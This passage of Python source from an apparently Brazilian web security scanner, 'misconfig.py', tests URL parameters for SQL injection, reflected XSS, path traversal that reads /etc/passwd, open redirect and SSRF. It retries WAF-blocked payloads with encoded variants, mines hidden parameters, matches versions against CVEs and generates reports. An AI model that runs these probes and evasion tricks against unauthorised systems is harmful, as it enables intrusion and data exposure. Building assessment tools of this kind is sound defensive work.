        params = [k for k, _ in parse_qsl(pu.query, keep_blank_values=True)]
        if not params:
            continue
        for pn in params:
            inventory.setdefault(pu.path, set()).add(pn)
        sig = (pu.path, tuple(sorted(set(params))))
        if sig not in seen_sig:
            seen_sig.add(sig)
            param_urls.append(u)
    if not inventory:
        return
    all_params = sorted({p for ps in inventory.values() for p in ps})
    total = sum(len(v) for v in inventory.values())
    vlog(opts, 1, f"  {C.BLUE}> fuzzing de parametros ({len(param_urls)} URLs, "
                  f"{len(all_params)} params distintos){C.RESET}")
    inv_str = "; ".join(f"{path}?{','.join(sorted(ps))}" for path, ps in list(inventory.items())[:12])
    bag.add(Finding(host, "info_disclosure", "INFO",
                    f"Inventario de parametros descobertos ({total} em {len(inventory)} endpoints)",
                    inv_str[:400], base + "/", ", ".join(all_params[:25])))

    def test_url(u):
        pairs0 = parse_qsl(urlparse(u).query, keep_blank_values=True)
        orig_vals = dict(pairs0)
        params = list(dict.fromkeys(k for k, _ in pairs0))[:8]
        def det_sqli(r):
            b = read_body(r, 40000)
            return any(pat.search(b) for pat, _ in ERROR_PATTERNS)

        def det_lfi(r):
            return bool(LFI_SIGNATURE.search(read_body(r, 20000)))

        def det_ssrf(r):
            return bool(SSRF_SIGNATURES.search(read_body(r, 40000)))

        def det_redir(r):
            return r.status_code in (301, 302, 303, 307, 308) and OOB_MARKER in r.headers.get("Location", "")

        for pn in params:
            # 1. SQLi / erro baseado em parametro (+ evasao se o WAF bloquear o payload cru)
            hit = blocked = False
            for pl in PARAM_SQLI_PAYLOADS[:3]:
                tu = _set_param(u, pn, pl)
                r = do_request(sess, "GET", tu, opts)
                if r is None:
                    continue
                if _is_blocked(r):
                    blocked = True
                    continue
                body = read_body(r, 40000)
                for pat, desc in ERROR_PATTERNS:
                    if pat.search(body):
                        bag.add(Finding(host, "misconfig", "HIGH",
                                        f"Erro/possivel SQLi injetando o parametro '{pn}'",
                                        desc, tu, f"payload={pl}"))
                        hit = True
                        break
                if hit:
                    break
            if blocked and not hit:  # payload cru barrado pelo WAF -> tenta variantes encodadas
                ev = _try_evasion(sess, u, pn, "'", det_sqli, opts)
                if ev:
                    lbl, evu, var = ev
                    bag.add(Finding(host, "misconfig", "HIGH",
                                    f"SQLi contornando WAF/filtro via '{lbl}' no parametro '{pn}'",
                                    "payload cru foi BLOQUEADO, mas a variante encodada passou e disparou erro SQL",
                                    evu, f"tecnica={lbl} | variante={var[:70]}"))
            # 2. XSS refletido (+ evasao se bloqueado)
            canary = "mcx" + "".join(random.choices(string.ascii_lowercase, k=6))
            marker = f"{canary}<svg/onload=x>"
            tu = _set_param(u, pn, marker)
            r = do_request(sess, "GET", tu, opts)
            # so e XSS se refletido em contexto HTML (JSON/texto refletido nao e exploravel)
            xss_ctx = r is not None and ("html" in r.headers.get("Content-Type", "").lower()
                                         or not r.headers.get("Content-Type", ""))
            if r is not None and not _is_blocked(r) and xss_ctx and marker in read_body(r, 60000):
                bag.add(Finding(host, "misconfig", "HIGH",
                                f"Reflexao sem encoding no parametro '{pn}' (possivel XSS)",
                                "payload refletido literalmente em resposta HTML", tu, marker[:40]))
            elif r is not None and _is_blocked(r):
                ev = _try_evasion(sess, u, pn, marker, lambda rr: marker in read_body(rr, 60000), opts)
                if ev:
                    lbl, evu, var = ev
                    bag.add(Finding(host, "misconfig", "HIGH",
                                    f"XSS contornando WAF/filtro via '{lbl}' no parametro '{pn}'",
                                    "payload cru BLOQUEADO, mas a variante encodada refletiu sem sanitizacao",
                                    evu, f"tecnica={lbl}"))
            # 3. LFI / path traversal (+ variantes de traversal encodado se bloqueado)
            lfi_hit = lfi_blocked = False
            for pl in PARAM_LFI_PAYLOADS[:3]:
                tu = _set_param(u, pn, pl)
                r = do_request(sess, "GET", tu, opts)
                if r is None:
                    continue
                if _is_blocked(r):
                    lfi_blocked = True
                    continue
                if LFI_SIGNATURE.search(read_body(r, 20000)):
                    bag.add(Finding(host, "sensitive_data", "CRITICAL",
                                    f"Possivel LFI/Path traversal no parametro '{pn}'",
                                    "/etc/passwd lido na resposta", tu, f"payload={pl}"))
                    lfi_hit = True
                    break
            if lfi_blocked and not lfi_hit:
                lfi_vars = [("traversal-encoded", v) for v in LFI_TRAVERSAL_VARIANTS]
                ev = _try_evasion(sess, u, pn, "", det_lfi, opts, variants=lfi_vars)
                if ev:
                    lbl, evu, var = ev
                    bag.add(Finding(host, "sensitive_data", "CRITICAL",
                                    f"LFI contornando WAF/filtro via '{lbl}' no parametro '{pn}'",
                                    "traversal cru BLOQUEADO, mas a variante encodada leu /etc/passwd",
                                    evu, f"variante={var[:70]}"))
            # 4. Open redirect por parametro (+ evasao se bloqueado)
            if pn.lower() in REDIRECT_PARAM_NAMES:
                tu = _set_param(u, pn, OPEN_REDIRECT_PAYLOAD)
                r = do_request(sess, "GET", tu, opts, allow_redirects=False)
                if r is not None and not _is_blocked(r) and det_redir(r):
                    bag.add(Finding(host, "misconfig", "MEDIUM",
                                    f"Open redirect no parametro '{pn}'", "",
                                    tu, f"Location: {r.headers.get('Location','')}"))
                elif r is not None and _is_blocked(r):
                    ev = _try_evasion(sess, u, pn, OPEN_REDIRECT_PAYLOAD, det_redir, opts,
                                      redirect=True, variants=REDIRECT_EVASION_VARIANTS)
                    if ev:
                        lbl, evu, var = ev
                        bag.add(Finding(host, "misconfig", "MEDIUM",
                                        f"Open redirect contornando WAF/filtro via '{lbl}' no parametro '{pn}'",
                                        "redirect cru BLOQUEADO, mas a variante encodada redirecionou p/ dominio externo",
                                        evu, f"tecnica={lbl}"))
            # 5. SSRF por parametro — SO com --webhook (validacao OUT-OF-BAND, zero falso positivo).
            #    Sem webhook nao testa SSRF: a deteccao por assinatura in-band gerava muito FP.
            wv = opts.get("webhook_validator")
            if wv is not None and pn.lower() in SSRF_PARAM_NAMES:
                # injeta a URL de callback unica; so vira achado se o alvo bater no webhook.
                canary, cb = wv.new_probe(host, pn, u, "")
                tu = _set_param(u, pn, cb)
                # registra a URL realmente injetada (p/ curl de reproducao no achado)
                wv.probes[canary]["injected"] = tu
                do_request(sess, "GET", tu, opts)
                # tambem tenta a variante http:// (fetchers internos costumam recusar https/cert)
                if cb.startswith("https://"):
                    canary2, cb2 = wv.new_probe(host, pn, u, "")
                    tu2 = _set_param(u, pn, "http://" + cb2.split("://", 1)[1])
                    wv.probes[canary2]["injected"] = tu2
                    do_request(sess, "GET", tu2, opts)
            # 6. SQLi blind boolean-based (compara respostas TRUE vs FALSE)
            #    So testa quando o valor original e numerico -> menor ruido, sinal mais confiavel
            if not hit and orig_vals.get(pn, "").isdigit():
                ov = orig_vals[pn]
                # 2 baselines: so prossegue se a pagina for ESTAVEL (senao length-diff e ruido)
                b1 = do_request(sess, "GET", u, opts)
                b2 = do_request(sess, "GET", u, opts)
                l1 = len(b1.content) if b1 is not None else -1
                l2 = len(b2.content) if b2 is not None else -2
                base_len = l1
                stable = l1 > 0 and abs(l1 - l2) <= max(8, l1 * 0.01)  # <=1% de variacao
                if stable:
                    for ptrue, pfalse in ((f"{ov} AND 1=1", f"{ov} AND 1=2"),
                                          (f"{ov}' AND '1'='1", f"{ov}' AND '1'='2")):
                        rt = do_request(sess, "GET", _set_param(u, pn, ptrue), opts)
                        rf = do_request(sess, "GET", _set_param(u, pn, pfalse), opts)
                        if rt is None or rf is None:
                            continue
                        lt, lf = len(rt.content), len(rf.content)
                        # TRUE ~ baseline (mesmos dados) e FALSE difere claramente (0 linhas)
                        if abs(lt - base_len) <= max(16, base_len * 0.03) \
                                and abs(lt - lf) >= max(48, base_len * 0.15):
                            bag.add(Finding(host, "misconfig", "HIGH",
                                            f"Possivel SQLi blind (boolean-based) no parametro '{pn}'",
                                            f"pagina estavel; TRUE~baseline ({lt}b) mas FALSE difere ({lf}b)",
                                            _set_param(u, pn, ptrue),
                                            f"true='{ptrue}' | false='{pfalse}'", confidence="media"))
                            break
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(test_url, param_urls[:40]))


def mine_parameters(sess, host, base, opts, bag):
    """Descoberta de parametros ocultos (param mining) por reflexao de canario."""
    if not opts["param_mining"]:
        return
    vlog(opts, 1, f"  {C.BLUE}> param mining ({len(PARAM_MINING_WORDLIST)} nomes){C.RESET}")
    found = []
    lock = threading.Lock()

    def probe(name):
        canary = "pm" + "".join(random.choices(string.ascii_lowercase, k=7))
        u = f"{base}/?{name}={canary}"
        r = do_request(sess, "GET", u, opts)
        if r is None:
            return
        if canary in read_body(r, 60000):
            with lock:
                found.append(name)
    with concurrent.futures.ThreadPoolExecutor(max_workers=opts["path_threads"]) as ex:
        list(ex.map(probe, PARAM_MINING_WORDLIST))
    if found:
        bag.add(Finding(host, "info_disclosure", "LOW",
                        f"Parametros ocultos refletidos ({len(found)})",
                        "nomes que a aplicacao processa e reflete", base + "/",
                        ", ".join(sorted(found)[:20]), confidence="baixa"))


def load_wordlist(path):
    """Le paths extras (um por linha) para fuzzing. Retorna lista de tuplas de entrada."""
    entries = []
    if not path:
        return entries
    if not os.path.isfile(path):
        p(f"{C.YELLOW}[!]{C.RESET} Wordlist nao encontrada: {path}")
        return entries
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if not line.startswith("/"):
                line = "/" + line
            entries.append((line, f"Path da wordlist acessivel: {line}", "MEDIUM", "info_disclosure"))
    return entries


# --------------------------------------------------------------------------- #
# Fingerprint de tecnologias / CVEs
# --------------------------------------------------------------------------- #
def _ver_tuple(v):
    return tuple(int(x) for x in re.findall(r"\d+", v)[:4]) if v else ()


def _version_vuln(ver, cmp):
    op = cmp[0]
    if op == "*":
        return True  # EOL / qualquer versao
    a = _ver_tuple(ver)
    if not a:
        return False
    if op == "<":
        return a < _ver_tuple(cmp[1])
    if op == "==":
        return a == _ver_tuple(cmp[1])
    if op == "range":
        return _ver_tuple(cmp[1]) <= a <= _ver_tuple(cmp[2])
    return False


def fingerprint_tech(host, base, resp, home_body, opts, bag):
    """Identifica tecnologias (headers/cookies/body) e sinaliza versoes com CVEs conhecidos."""
    if opts["no_fingerprint"]:
        return
    techs = {}
    headers = {k.lower(): v for k, v in resp.headers.items()}
    for name, src, rgx in TECH_HEADER_FP:
        val = headers.get(src, "")
        if not val:
            continue
        m = rgx.search(val)
        if m:
            ver = (m.group(1) if m.lastindex else "") or ""
            if name not in techs or (ver and not techs[name]):
                techs[name] = ver
    cookie = headers.get("set-cookie", "")
    for name, rgx in TECH_COOKIE_FP:
        if rgx.search(cookie) and name not in techs:
            techs[name] = ""
    for name, rgx in TECH_BODY_FP:
        m = rgx.search(home_body or "")
        if m:
            ver = (m.group(1) if m.lastindex else "") or ""
            if name not in techs or (ver and not techs[name]):
                techs[name] = ver
    if not techs:
        return
    label = ", ".join(f"{n} {v}".strip() for n, v in sorted(techs.items()))
    vlog(opts, 1, f"  {C.CYAN}> tecnologias: {label}{C.RESET}")
    bag.add(Finding(host, "tecnologia", "INFO", f"Tecnologias detectadas ({len(techs)})",
                    label, base + "/", label, method="TECH"))
    for name, ver in techs.items():
        for (t, cmp, cve, desc, sev) in VULN_DB:
            if t == name and _version_vuln(ver, cmp):
                vshown = f"{name} {ver}".strip()
                bag.add(Finding(host, "vulnerabilidade", sev,
                                f"Versao potencialmente vulneravel: {vshown}",
                                desc, base + "/", f"{cve} — {vshown}", method="CVE"))


# --------------------------------------------------------------------------- #
# Autenticacao (-u / -p): Basic, login por formulario/JSON, Bearer
# --------------------------------------------------------------------------- #
LOGIN_PATHS = [
    "/api/login", "/api/auth", "/api/v1/login", "/api/v1/auth", "/api/authenticate",
    "/api/session", "/api/sessions", "/api/users/login", "/api/token", "/oauth/token",
    "/login", "/auth", "/signin", "/api/signin", "/account/login", "/user/login",
    "/rest/auth", "/rest/login", "/session", "/j_security_check",
]
LOGIN_USER_FIELDS = ["username", "email", "user", "login", "identifier",
                     "j_username", "userName", "usr", "account"]
LOGIN_PASS_FIELDS = ["password", "passwd", "pass", "j_password", "pwd", "userPassword"]
LOGIN_TOKEN_KEYS = ["access_token", "accessToken", "token", "jwt", "id_token", "idToken",
                    "authToken", "auth_token", "bearer", "session_token", "apiToken"]
LOGIN_FAIL_WORDS = re.compile(r"(?i)invalid|incorrect|failed|denied|unauthor|"
                              r"bad credentials|wrong|erro de login|senha invalida")


def _login_payload(user, pw):
    d = {}
    for uf in LOGIN_USER_FIELDS:
        d[uf] = user
    for pf in LOGIN_PASS_FIELDS:
        d[pf] = pw
    return d


def _find_token(obj, depth=0):
    """Busca recursiva por um token de acesso em um dict/list JSON."""
    if depth > 6:
        return None
    if isinstance(obj, dict):
        for k, v in obj.items():
            if str(k) in LOGIN_TOKEN_KEYS and isinstance(v, str) and len(v) >= 16:
                return v
        for v in obj.values():
            t = _find_token(v, depth + 1)
            if t:
                return t
    elif isinstance(obj, list):
        for v in obj[:20]:
            t = _find_token(v, depth + 1)
            if t:
                return t
    return None


def authenticate(sess, base, host, opts, bag):
    """Autentica a sessao usando -u/-p. Retorna True se conseguiu (ou configurou Basic)."""
    user = opts.get("user")
    pw = opts.get("password")
    if not user:
        return False
    at = opts.get("auth_type", "auto")

    if at == "basic":
        sess.auth = (user, pw or "")
        p(f"{C.GREEN}[+]{C.RESET} {host}: autenticacao HTTP Basic configurada ({user})")
        return True

    # form / json / auto: tenta login em endpoints comuns (ou --login-url)
    endpoints = [opts["login_url"]] if opts.get("login_url") else LOGIN_PATHS
    payload = _login_payload(user, pw)
    modes = []
    if at in ("auto", "json"):
        modes.append(("json", {"json": payload, "headers": {"Content-Type": "application/json"}}))
    if at in ("auto", "form"):
        modes.append(("form", {"data": payload}))

    for ep in endpoints:
        url = ep if ep.startswith("http") else base + ep
        for mode_name, kw in modes:
            r = do_request(sess, "POST", url, opts, allow_redirects=False, **kw)
            if r is None or r.status_code not in (200, 201, 202, 204, 302, 303):
                continue
            body = read_body(r, 20000)
            # 1. token no corpo -> Bearer
            token = None
            if body.lstrip()[:1] in ("{", "["):
                try:
                    token = _find_token(json.loads(body))
                except Exception:
                    token = None
            if not token:
                token = next(iter(JWT_RE.findall(body)), None)
            if token:
                sess.headers["Authorization"] = f"Bearer {token}"
                p(f"{C.GREEN}[+]{C.RESET} {host}: login OK em {ep} "
                  f"{C.DIM}(Bearer via {mode_name}){C.RESET}")
                return True
            # 2. cookie de sessao (se cookies habilitados) sem sinal de falha
            set_cookie = r.headers.get("Set-Cookie", "")
            if set_cookie and not opts.get("no_session_cookies") and not LOGIN_FAIL_WORDS.search(body):
                p(f"{C.GREEN}[+]{C.RESET} {host}: login OK em {ep} "
                  f"{C.DIM}(cookie de sessao via {mode_name}){C.RESET}")
                return True

    # fallback: Basic auth em modo auto
    if at == "auto":
        sess.auth = (user, pw or "")
        p(f"{C.YELLOW}[!]{C.RESET} {host}: login por formulario nao confirmado; "
          f"usando HTTP Basic como fallback ({user})")
        return True
    p(f"{C.RED}[-]{C.RESET} {host}: falha ao autenticar com as credenciais fornecidas")
    return False


# --------------------------------------------------------------------------- #
# Orquestracao por alvo
# --------------------------------------------------------------------------- #
def scan_target(raw_target, opts, bag):
    norm = normalize_target(raw_target)
    if not norm:
        return
    base_https, base_http, host = norm
    sess = build_session(opts)

    vlog(opts, 1, f"\n{C.BOLD}{C.WHITE}==> {host}{C.RESET}")
    base, resp = check_reachability(sess, base_https, base_http, host, opts, bag)
    if base is None:
        p(f"{C.RED}[-]{C.RESET} {host}: inacessivel")
        sess.close()
        return

    scheme = base.split("://")[0].upper()
    p(f"{C.GREEN}[+]{C.RESET} {host}: online via {scheme} (HTTP {resp.status_code}) "
      f"{C.DIM}{resp.headers.get('Server','')}{C.RESET}")

    # URL-semente com parametros: se o alvo passado ja traz ?a=b, esses parametros
    # SEMPRE sao testados (independe de --urls). Reconstroi na escolha de esquema alcancavel.
    seed_param_urls = []
    _seed_raw = raw_target if "://" in raw_target else "http://" + raw_target
    _seed_pr = urlparse(_seed_raw)
    if _seed_pr.query:
        seed_full = base + (_seed_pr.path or "/") + "?" + _seed_pr.query
        seed_param_urls.append(seed_full)

    # Autenticacao (-u/-p): se solicitada, autentica e re-busca a home autenticada
    if opts.get("user"):
        if authenticate(sess, base, host, opts, bag):
            r2 = do_request(sess, "GET", base + "/", opts, allow_redirects=True)
            if r2 is not None:
                resp = r2

    # Calibracao de baseline: detecta catch-all do host (raiz + por diretorio sob demanda)
    vlog(opts, 1, f"  {C.BLUE}> calibrando baseline (paths aleatorios){C.RESET}")
    sess._base = base
    sess._opts = opts
    sess._bl_lock = threading.Lock()
    sess._bl_locks = {}
    root_bl = calibrate_baseline(sess, base, opts, "/")
    sess._baselines = {"/": root_bl}
    sess._baseline = root_bl  # compat

    jwt_ctx = {"tokens": set(), "secrets": set()}

    # 0. DNS recon + subdominios do certificado (nivel host)
    dns_recon(host, opts, bag)
    extract_cert_sans(host, opts, bag)

    # 1. Cabecalhos + fingerprint de tecnologias/CVEs
    vlog(opts, 1, f"  {C.BLUE}> analise de cabecalhos + fingerprint de tecnologias{C.RESET}")
    check_headers(host, base, resp, bag)
    # 2. Corpo da home (segredos, erros, comentarios HTML)
    vlog(opts, 1, f"  {C.BLUE}> analise do corpo (segredos/erros/listing/comentarios){C.RESET}")
    home_body = read_body(resp)
    scan_body_for_secrets(host, base + "/", home_body, bag)
    scan_body_for_errors(host, base + "/", home_body, bag)
    scan_html_comments(host, base + "/", home_body, bag)
    scan_jwts(host, base + "/", home_body, opts, bag,
              extra_tokens=JWT_RE.findall(resp.headers.get("Set-Cookie", "")), ctx=jwt_ctx)
    # 2b. Fingerprint de tecnologias e CVEs conhecidos
    fingerprint_tech(host, base, resp, home_body, opts, bag)
    # 3. CORS
    vlog(opts, 1, f"  {C.BLUE}> teste de CORS{C.RESET}")
    check_cors(sess, host, base, opts, bag)
    # 4. Metodos HTTP
    vlog(opts, 1, f"  {C.BLUE}> metodos HTTP (OPTIONS/TRACE){C.RESET}")
    check_http_methods(sess, host, base, opts, bag)
    # 5. Arquivos sensiveis (pulado no --api-mode)
    if not opts["api_mode"]:
        scan_sensitive_paths(sess, host, base, opts, bag)
    # 6. .git confirm
    check_git_exposure(sess, host, base, opts, bag)
    # 7. Backups
    if not opts["no_backup"]:
        scan_backups(sess, host, base, opts, bag)
    # 8. API discovery + Swagger parse (coleta endpoints p/ testes profundos)
    api_eps = []
    scan_api(sess, host, base, opts, bag, api_eps, jwt_ctx)
    # 8a. Enumeracao ativa de endpoints de API (brute de recursos + BOLA por IDs)
    enum_api_endpoints(sess, host, base, api_eps, opts, bag, jwt_ctx)
    # 8b. Testes profundos de API (auth bypass, JWT bypass, shadow, CORS, rate limit, mass assign)
    api_deep_tests(sess, host, base, api_eps, opts, bag, jwt_ctx)
    # 9. GraphQL (introspection, mutations, field suggestion, batching, CSRF)
    vlog(opts, 1, f"  {C.BLUE}> GraphQL (introspection/mutations/batching/CSRF){C.RESET}")
    test_graphql(sess, host, base, opts, bag)
    # 10. POST tests
    test_post_endpoints(sess, host, base, opts, bag)
    # 11. Verb tampering
    vlog(opts, 1, f"  {C.BLUE}> verb tampering / bypass de metodo{C.RESET}")
    test_verb_tampering(sess, host, base, opts, bag)
    # 12. Cloud storage (S3/GCS/Azure/DO) + Firebase
    check_cloud_storage(sess, host, base, home_body, opts, bag)
    check_firebase(sess, host, base, home_body, opts, bag)
    # 13. Crawling de assets JS (segredos/sourcemap/endpoints)
    crawl_assets(sess, host, base, home_body, opts, bag)
    # 13b. Enumeracao de URLs (Wayback/sitemap/robots/crawl) + analise + fuzzing de parametros
    if opts["enum_urls"]:
        discovered = enumerate_urls(sess, host, base, home_body, opts, bag)
        scan_discovered_urls(sess, host, base, discovered, opts, bag)
        # inclui os parametros da URL-semente junto com os descobertos
        test_parameters(sess, host, base,
                        list(dict.fromkeys(seed_param_urls + discovered)), opts, bag)
    elif seed_param_urls:
        # sem enum de URLs, mas o alvo passado tem parametros -> testa so eles
        test_parameters(sess, host, base, seed_param_urls, opts, bag)
    # 13c. Descoberta de parametros ocultos (param mining)
    mine_parameters(sess, host, base, opts, bag)
    # 14-17. Fases web genericas (puladas no --api-mode)
    if not opts["api_mode"]:
        # 14. .well-known estendido
        check_well_known(sess, host, base, opts, bag)
        # 15. Info disclosure baseado em erro
        check_error_disclosure(sess, host, base, opts, bag)
        # 16. Open redirect
        check_open_redirect(sess, host, base, opts, bag)
        # 17. Host header injection
        check_host_header_injection(sess, host, base, opts, bag)
    # 18. TLS
    if base.startswith("https") and not opts["no_tls"]:
        vlog(opts, 1, f"  {C.BLUE}> analise de certificado TLS{C.RESET}")
        check_tls(host, opts, bag)

    sess.close()
    n = len([f for f in bag.items if f.target == host])
    p(f"{C.YELLOW}[!]{C.RESET} {host}: {n} achado(s) acumulado(s)")


# --------------------------------------------------------------------------- #
# Saida
# --------------------------------------------------------------------------- #
# Rotulos em PT-BR
SEV_PT = {"CRITICAL": "CRITICO", "HIGH": "ALTO", "MEDIUM": "MEDIO",
          "LOW": "BAIXO", "INFO": "INFORMATIVO"}
CAT_PT = {"sensitive_data": "Dados sensiveis expostos",
          "misconfig": "Configuracao incorreta (misconfig)",
          "info_disclosure": "Divulgacao de informacao",
          "vulnerabilidade": "Vulnerabilidade conhecida (CVE)",
          "tecnologia": "Tecnologia detectada",
          "modificacao": "RECURSO MODIFICADO (reverter)"}


def print_report(all_findings, opts, elapsed):
    W = 78
    p()
    p(f"{C.BOLD}{C.CYAN}{'='*W}{C.RESET}")
    p(f"{C.BOLD}{C.CYAN}  RELATORIO FINAL - misconfig.py{C.RESET}")
    p(f"{C.BOLD}{C.CYAN}{'='*W}{C.RESET}")

    counts = {}
    cat_counts = {}
    for f in all_findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1
        cat_counts[f.category] = cat_counts.get(f.category, 0) + 1

    # ---- RESUMO GERAL ----
    by_target = {}
    for f in all_findings:
        by_target.setdefault(f.target, []).append(f)
    p(f"\n{C.BOLD}RESUMO GERAL{C.RESET}")
    parts = []
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        n = counts.get(sev, 0)
        col = SEVERITY_COLOR[sev]()
        parts.append(f"{col}{SEV_PT[sev]}: {n}{C.RESET}")
    p("  Criticidade : " + "   ".join(parts))
    if cat_counts:
        catp = "   ".join(f"{CAT_PT.get(c, c)}: {n}" for c, n in
                          sorted(cat_counts.items(), key=lambda x: -x[1]))
        p(f"  Por tipo    : {C.DIM}{catp}{C.RESET}")
    p(f"  Totais      : {len(all_findings)} achados | {len(by_target)} alvo(s) | "
      f"{STATS.requests} requisicoes ({STATS.errors} erros) | {elapsed:.1f}s")

    if not all_findings:
        p(f"\n  {C.GREEN}Nenhum achado relevante.{C.RESET}\n")
        return

    # ---- DETALHE POR ALVO ----
    for target, items in by_target.items():
        items.sort(key=lambda f: (SEVERITY_ORDER.get(f.severity, 9),
                                  f.category, f.title))
        tcounts = {}
        for f in items:
            tcounts[f.severity] = tcounts.get(f.severity, 0) + 1
        badge = " ".join(f"{SEVERITY_COLOR[s]()}{SEV_PT[s]}:{tcounts[s]}{C.RESET}"
                         for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO") if s in tcounts)
        p(f"\n{C.BOLD}{C.CYAN}{'-'*W}{C.RESET}")
        p(f"{C.BOLD}{C.WHITE}  ALVO: {target}{C.RESET}   {C.DIM}({len(items)} achados){C.RESET}")
        p(f"  {badge}")
        p(f"{C.BOLD}{C.CYAN}{'-'*W}{C.RESET}")

        idx = 0
        for f in items:
            idx += 1
            col = SEVERITY_COLOR.get(f.severity, lambda: "")()
            sev_pt = SEV_PT.get(f.severity, f.severity)
            meth = f.method if f.method else "GET"
            # cabecalho do achado
            p(f"\n  {col}{C.BOLD}[{sev_pt}]{C.RESET} {C.BOLD}#{idx:02d} {f.title}{C.RESET}")
            # o que / onde / evidencia
            p(f"     {C.DIM}O que .....:{C.RESET} {f.detail if f.detail else f.title}")
            where = f"{meth}  {f.url}" if f.url else "(nivel host)"
            p(f"     {C.DIM}Onde ......:{C.RESET} {where}")
            if f.evidence:
                p(f"     {C.DIM}Evidencia .:{C.RESET} {f.evidence}")
            conf = getattr(f, "confidence", "alta") or "alta"
            conf_txt = "" if conf == "alta" else f"   {C.DIM}Confianca..:{C.RESET} {C.YELLOW}{conf}{C.RESET}"
            p(f"     {C.DIM}Tipo ......:{C.RESET} {CAT_PT.get(f.category, f.category)}   "
              f"{C.DIM}Criticidade:{C.RESET} {col}{sev_pt}{C.RESET}{conf_txt}")
            if f.curl:
                p(f"     {C.DIM}Reproduzir :{C.RESET} {C.CYAN}{f.curl}{C.RESET}")

    # ---- RESUMO FINAL: apenas CRITICO / ALTO / MEDIO (o quê, onde, tipo) ----
    relevantes = [f for f in all_findings if f.severity in ("CRITICAL", "HIGH", "MEDIUM")]
    relevantes.sort(key=lambda f: (SEVERITY_ORDER.get(f.severity, 9), f.target, f.category))
    p(f"\n{C.BOLD}{C.CYAN}{'='*W}{C.RESET}")
    p(f"{C.BOLD}{C.CYAN}  RESUMO DOS ACHADOS RELEVANTES (CRITICO / ALTO / MEDIO){C.RESET}")
    p(f"{C.BOLD}{C.CYAN}{'='*W}{C.RESET}")
    if not relevantes:
        p(f"\n  {C.GREEN}Nenhum achado critico/alto/medio.{C.RESET}")
    else:
        cc = {s: sum(1 for f in relevantes if f.severity == s) for s in ("CRITICAL", "HIGH", "MEDIUM")}
        p(f"  {SEVERITY_COLOR['CRITICAL']()}CRITICO: {cc['CRITICAL']}{C.RESET}   "
          f"{SEVERITY_COLOR['HIGH']()}ALTO: {cc['HIGH']}{C.RESET}   "
          f"{SEVERITY_COLOR['MEDIUM']()}MEDIO: {cc['MEDIUM']}{C.RESET}")
        last_sev = None
        for f in relevantes:
            if f.severity != last_sev:
                last_sev = f.severity
                p("")  # espaco entre grupos de criticidade
            col = SEVERITY_COLOR.get(f.severity, lambda: "")()
            sev_pt = SEV_PT.get(f.severity, f.severity)
            meth = "" if (not f.method or f.method == "GET") else f"{f.method} "
            onde = f"{meth}{f.url}" if f.url else "(nivel host)"
            conf = getattr(f, "confidence", "alta") or "alta"
            conf_tag = "" if conf == "alta" else f"  {C.YELLOW}(confianca: {conf}){C.RESET}"
            p(f"  {col}{C.BOLD}[{sev_pt:<8}]{C.RESET} {f.title}{conf_tag}")
            p(f"             {C.DIM}caminho:{C.RESET} {onde}")
            p(f"             {C.DIM}tipo   :{C.RESET} {CAT_PT.get(f.category, f.category)}")
            if f.curl:
                p(f"             {C.DIM}curl   :{C.RESET} {C.CYAN}{f.curl}{C.RESET}")

    p(f"\n{C.BOLD}{C.CYAN}{'='*W}{C.RESET}\n")


def _file_url(path):
    """Converte um caminho local em URL file:// clicavel no terminal.
    Trata WSL (/mnt/c/... -> file:///C:/...) e Windows (C:\\... -> file:///C:/...)."""
    ap = os.path.abspath(path)
    # WSL: /mnt/<letra>/resto  ->  <LETRA>:/resto
    m = re.match(r"^/mnt/([a-zA-Z])/(.*)$", ap)
    if m:
        url = "file:///%s:/%s" % (m.group(1).upper(), m.group(2).replace("\\", "/"))
    else:
        # Windows: C:\resto  ou  C:/resto
        m = re.match(r"^([a-zA-Z]):[\\/](.*)$", ap)
        if m:
            url = "file:///%s:/%s" % (m.group(1).upper(), m.group(2).replace("\\", "/"))
        else:
            # caminho absoluto Linux comum
            url = "file://" + ap.replace("\\", "/")
    return url.replace(" ", "%20")


def save_json(all_findings, path, meta):
    data = {"tool": "misconfig.py",
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "meta": meta, "summary": {}, "findings": [f.to_dict() for f in all_findings]}
    for f in all_findings:
        data["summary"][f.severity] = data["summary"].get(f.severity, 0) + 1
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)
    p(f"{C.GREEN}[+]{C.RESET} Relatorio JSON salvo em: {_file_url(path)}")


HTML_SEV = {"CRITICAL": ("CRITICO", "#8e24aa"), "HIGH": ("ALTO", "#e53935"),
            "MEDIUM": ("MEDIO", "#fb8c00"), "LOW": ("BAIXO", "#1e88e5"),
            "INFO": ("INFO", "#757575")}


def save_html(all_findings, path, meta):
    """Gera um relatorio HTML navegavel, auto-contido (abre offline), com filtro e busca."""
    e = _html.escape
    counts = {}
    for f in all_findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings = sorted(all_findings, key=lambda f: (order.get(f.severity, 9), f.target, f.category))
    gen = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    badges = "".join(
        f'<span class="badge" style="background:{HTML_SEV[s][1]}">{HTML_SEV[s][0]}: {counts.get(s,0)}</span>'
        for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"))
    btns = '<button class="fbtn active" data-sev="all">Todos</button>' + "".join(
        f'<button class="fbtn" data-sev="{s}">{HTML_SEV[s][0]}</button>'
        for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"))

    rows = []
    for i, f in enumerate(findings, 1):
        sev_pt, color = HTML_SEV.get(f.severity, (f.severity, "#555"))
        conf = getattr(f, "confidence", "alta") or "alta"
        conf_html = "" if conf == "alta" else f'<span class="conf">confianca: {e(conf)}</span>'
        meth = "" if (not f.method or f.method == "GET") else f'<span class="meth">{e(f.method)}</span> '
        url_html = f'<div class="url">{meth}{e(f.url)}</div>' if f.url else '<div class="url dim">(nivel host)</div>'
        detail = f'<div class="detail">{e(f.detail)}</div>' if f.detail else ""
        evid = f'<div class="evid"><b>Evidencia:</b> {e(f.evidence)}</div>' if f.evidence else ""
        curl = ""
